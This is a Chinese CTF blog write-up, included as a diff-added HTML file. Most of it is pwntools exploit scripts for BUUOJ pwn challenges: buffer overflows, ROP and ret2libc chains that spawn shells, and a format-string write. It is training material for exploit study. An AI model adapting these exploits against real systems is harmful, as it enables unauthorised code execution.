@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="CTF" />
+   
+  <meta name="description" content="CTFer,CUMT" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    BUU(PWN) |  pz1o
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="pz1o" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-BUU-PWN"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  BUU(PWN)
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2100/01/23/BUU-PWN/" class="article-date">
+  <time datetime="2100-01-23T06:22:39.000Z" itemprop="datePublished">2100-01-23</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PWN/">PWN</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">3.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">18 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>寒假开始刷题</p>
+<h1 id="BUU（栈）"><a href="#BUU（栈）" class="headerlink" title="BUU（栈）"></a>BUU（栈）</h1><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#node3.buuoj.cn:28301</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28301</span>)</span><br><span class="line"><span class="comment">#r = process("")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28698</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn1_sctf_2016")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'I'</span>*<span class="number">20</span> + <span class="string">b'A'</span>*<span class="number">0x4</span> + p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="第六章-CTF之PWN章-stack"><a href="#第六章-CTF之PWN章-stack" class="headerlink" title="[第六章 CTF之PWN章]stack"></a>[第六章 CTF之PWN章]stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26846</span>)</span><br><span class="line"><span class="comment">#r = process("./stack")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0xA</span>+<span class="number">0x8</span>) + p64(<span class="number">0x400537</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="第六章-CTF之PWN章-ROP（64位系统调用）"><a href="#第六章-CTF之PWN章-ROP（64位系统调用）" class="headerlink" title="[第六章 CTF之PWN章]ROP（64位系统调用）"></a>[第六章 CTF之PWN章]ROP（64位系统调用）</h2><p>64位的系统调用</p>
+<p>&gt;<br>&gt;<br>&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p&#x3D;process(&#39;.&#x2F;rop&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;rop&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br><span class="line">pop_rdi &#x3D; 0x4005d3</span><br><span class="line">puts_got &#x3D; 0x601018</span><br><span class="line">puts &#x3D; 0x400430</span><br><span class="line">main &#x3D; 0x400537</span><br><span class="line">rop1 &#x3D; &quot;a&quot;*18</span><br><span class="line">rop1 +&#x3D; p64(pop_rdi)</span><br><span class="line">rop1 +&#x3D; p64(puts_got)</span><br><span class="line">rop1 +&#x3D; p64(puts)</span><br><span class="line">rop1 +&#x3D; p64(main)</span><br><span class="line">p.sendline(rop1)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">addr &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">libc_base &#x3D; addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class="line">pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class="line">pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class="line">pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class="line">syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class="line">binsh   &#x3D; next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;),) + libc_base</span><br><span class="line">rop2 &#x3D; &quot;a&quot;*18</span><br><span class="line">rop2 +&#x3D; p64(pop_rax)</span><br><span class="line">rop2 +&#x3D; p64(59)</span><br><span class="line">rop2 +&#x3D; p64(pop_rdi)</span><br><span class="line">rop2 +&#x3D; p64(binsh)</span><br><span class="line">rop2 +&#x3D; p64(pop_rsi)</span><br><span class="line">rop2 +&#x3D; p64(0)</span><br><span class="line">rop2 +&#x3D; p64(pop_rdx)</span><br><span class="line">rop2 +&#x3D; p64(0)</span><br><span class="line">rop2 +&#x3D; p64(syscall)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot;hello\n&quot;)</span><br><span class="line">p.sendline(rop2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>浮点数在内存中的存储</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	float a &#x3D; 11.28125;</span><br><span class="line">	unsigned char* p &#x3D;  (unsigned char*)&amp;a;</span><br><span class="line">	printf(&quot;0x%x %x %x %x&quot;,*(p+3),*(p+2),*(p+1),*(p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29611</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x2c</span>) + <span class="string">"\x00\x80\x34\x41"</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">r &#x3D; remote(&quot;node3.buuoj.cn&quot;,29477)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;A&#39;*(0x88) + p64(0x400596)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-c-1（64位的puts泄露）"><a href="#ciscn-2019-c-1（64位的puts泄露）" class="headerlink" title="ciscn_2019_c_1（64位的puts泄露）"></a>ciscn_2019_c_1（64位的puts泄露）</h2><p>本地可以打通</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29957</span>)</span><br><span class="line">p = process(<span class="string">"./pwn3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice!\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(encrypt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,puts-libc.symbols[<span class="string">'puts'</span>])</span><br><span class="line">libc_base = puts-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(next(libc.search(<span class="string">"/bin/sh"</span>)))</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>太废物了</p>
+<p>后来看了题解原来是18上面</p>
+<p>用libcsearcher</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27415</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">print(libc)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sl(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里需要注意</p>
+<p>18的ubuntu执行system会进行堆栈平衡</p>
+<p>解决办法是加ret指令</p>
+</blockquote>
+<h2 id="OGeek2019-babyrop（32位puts泄露）"><a href="#OGeek2019-babyrop（32位puts泄露）" class="headerlink" title="[OGeek2019]babyrop（32位puts泄露）"></a>[OGeek2019]babyrop（32位puts泄露）</h2><p>打通</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class="line">rl&#x3D;lambda :p.recvline()</span><br><span class="line">sl&#x3D;lambda x:p.sendline(x)</span><br><span class="line">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29517)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">payload &#x3D; b&#39;\x00&#39;*7 + b&#39;\xff&#39;</span><br><span class="line">main &#x3D; 0x8048825</span><br><span class="line">sl(payload)</span><br><span class="line">puts_plt &#x3D; elf.symbols[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">payload2 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(0x08048548) + p32(main) + p32(0x8049fd4)</span><br><span class="line">sla(&quot;Correct\n&quot;,payload2)</span><br><span class="line">puts &#x3D; u32(p.recv(4))</span><br><span class="line">log.info(&quot;libc base 0x%x&quot;,puts-libc.symbols[&#39;puts&#39;])</span><br><span class="line">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">bin_sh_addr &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class="line">sl(payload)</span><br><span class="line">payload3 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class="line">sla(&quot;Correct\n&quot;,payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="第五空间2019-决赛-PWN5（格式化字符串漏洞）"><a href="#第五空间2019-决赛-PWN5（格式化字符串漏洞）" class="headerlink" title="[第五空间2019 决赛]PWN5（格式化字符串漏洞）"></a>[第五空间2019 决赛]PWN5（格式化字符串漏洞）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class="line">rl&#x3D;lambda :p.recvline()</span><br><span class="line">sl&#x3D;lambda x:p.sendline(x)</span><br><span class="line">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27812)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">payload &#x3D; p32(0x804C044) + &quot;aaaa%10$n&quot;</span><br><span class="line">sl(payload)</span><br><span class="line">#print(p.recv())</span><br><span class="line">sl(b&#39;8&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>一开始准备\x00发现不可以</p>
+<blockquote>
+<p>unsigned __int8:表示无符号一个字节</p>
+<p>那么这里就可以溢出了，可以看下面这个eg</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">&gt;int main()</span><br><span class="line">&gt;&#123;	</span><br><span class="line">char a &#x3D; 0x100;</span><br><span class="line">printf(&quot;%d\n&quot;,a-1);</span><br><span class="line">printf(&quot;%d\n&quot;,a);</span><br><span class="line">printf(&quot;%d&quot;,a+1);</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;输出结果为 -1 0 1</span><br></pre></td></tr></table></figure>
+<p>为什么中间是0呢？</p>
+<p>因为char是1字节，最大为0xff也就是-1，</p>
+<p>继续加+1，就是0x100，已经超过0xff，就会丢弃，变成0</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29806)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;r2t3&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;r2t3&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">ret &#x3D; 0x080483be</span><br><span class="line">main &#x3D; 0x804863b</span><br><span class="line">system &#x3D; 0x804858b</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x15  + p32(system)</span><br><span class="line">payload &#x3D; payload.ljust(260,b&#39;A&#39;)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><blockquote>
+<p>好家伙,这题真是开眼了</p>
+</blockquote>
+<p>先说第一种方法</p>
